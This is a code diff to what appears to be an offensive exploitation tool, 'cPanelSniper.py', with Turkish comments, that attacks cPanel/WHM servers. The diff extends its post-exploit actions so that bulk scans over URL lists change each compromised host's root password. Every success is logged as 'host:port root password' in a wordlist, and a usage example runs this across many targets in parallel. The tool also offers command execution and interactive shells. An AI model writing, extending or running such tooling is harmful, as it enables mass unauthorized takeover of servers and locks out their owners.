@@ -656,6 +656,21 @@ def derive_acct_domain_suffix(ctx):
 
 
 BULK_RECORD_LOCK = threading.Lock()
+PASSWD_APPEND_LOCK = threading.Lock()
+
+
+def append_passwd_wordlist_line(path: str, target_url: str, user: str, password: str):
+    """Wordlist satırı ekle (append); çoklu iş parçacığı güvenli."""
+    if not path:
+        return
+    _, host, port = parse_target(target_url)
+    line = f"{host}:{port} {user} {password}\n"
+    d = os.path.dirname(os.path.abspath(path))
+    if d:
+        os.makedirs(d, exist_ok=True)
+    with PASSWD_APPEND_LOCK:
+        with open(path, "a", encoding="utf-8") as f:
+            f.write(line)
 
 
 def action_add_admin(ctx, username: str, password: str):
@@ -853,7 +868,16 @@ def scan(target: str, args) -> dict:
                           session_base, token, timeout)
 
     # ── Post-Exploit Actions ─────────────────────────────────────
-    if args.action and len(args.target_list) == 1:
+    pw_append_path = (getattr(args, "passwd_append_wordlist", None) or "").strip()
+    allow_post = False
+    if args.action:
+        a0 = args.action.lower()
+        if len(args.target_list) == 1:
+            allow_post = True
+        elif a0 == "passwd" and args.passwd and pw_append_path:
+            allow_post = True
+
+    if allow_post:
         ctx = result["ctx"]
         a = args.action.lower()
         log("API", f"Running post-exploit action: {a}")
@@ -863,6 +887,10 @@ def scan(target: str, args) -> dict:
             ok, http_s, data = action_change_passwd_result(ctx, args.passwd)
             safe_print(json.dumps(data, indent=2)[:800]
                        if isinstance(data, dict) else str(data)[:800])
+            if ok and pw_append_path:
+                append_passwd_wordlist_line(
+                    pw_append_path, target, "root", args.passwd)
+                log("API", f"passwd wordlist append → {pw_append_path}")
             pw_ok = getattr(args, "_bulk_passwd_successes", None)
             if pw_ok is not None:
                 ver = (result.get("finding") or {}).get("version")
@@ -1374,6 +1402,10 @@ Toplu yeni hesap (results.json → createacct, başarılılar ayrı dosyada):
 Toplu root şifre (results.json → WHM passwd; başarılar wordlist .txt):
   python3 cPanelSniper.py --results-json results.json --bulk-passwd \\
     --passwd 'P@ss2026Fikri'
+
+Çoklu URL tarama + passwd, başarıları kelime listesine biriktir (append):
+  python3 cPanelSniper.py -l urls.txt -t 15 --action passwd --passwd 'P@ss2026Fikri' \\
+    --passwd-append-wordlist hits.txt
         """
     )
     tg = p.add_argument_group("Target")
@@ -1390,6 +1422,9 @@ Toplu root şifre (results.json → WHM passwd; başarılar wordlist .txt):
     ag.add_argument("--action",  choices=["list","passwd","cmd","exec","info","version","shell","adduser"],
                     help="Post-exploit action (shell=interactive WHM shell)")
     ag.add_argument("--passwd",  help="Şifre (passwd / adduser / bulk modları)")
+    ag.add_argument("--passwd-append-wordlist", metavar="FILE",
+                    help="Çoklu tarama: her başarılı root passwd sonrası "
+                         "'host:port root şifre' satırını dosyaya ekler (silmez)")
     ag.add_argument("--cmd",     help="OS command to execute (--action cmd/exec)")
     ag.add_argument("--new-user",  help="Yeni cPanel kullanıcı adı (adduser / bulk)")
     ag.add_argument("--new-domain", help="Alan adı (adduser; yoksa user.hostname otomatik)")
@@ -1470,7 +1505,15 @@ Toplu root şifre (results.json → WHM passwd; başarılar wordlist .txt):
     print(f"   Threads  : {args.threads}")
     print(f"   Timeout  : {args.timeout}s")
     print(f"   Action   : {args.action or 'scan only'}")
+    pwl = (getattr(args, "passwd_append_wordlist", None) or "").strip()
+    if pwl:
+        print(f"   Passwd + : {pwl}  (append wordlist, çoklu hedefte passwd)")
     print()
+
+    if pwl and (args.action or "").lower() != "passwd":
+        log("WARN", "--passwd-append-wordlist yalnızca --action passwd ile kullanılmalıdır")
+    if pwl and not args.passwd:
+        log("WARN", "--passwd-append-wordlist için --passwd gerekir")
 
     signal.signal(signal.SIGINT,
                   lambda s,f: (print_summary(time.time()-t0, len(targets)), sys.exit(0)))
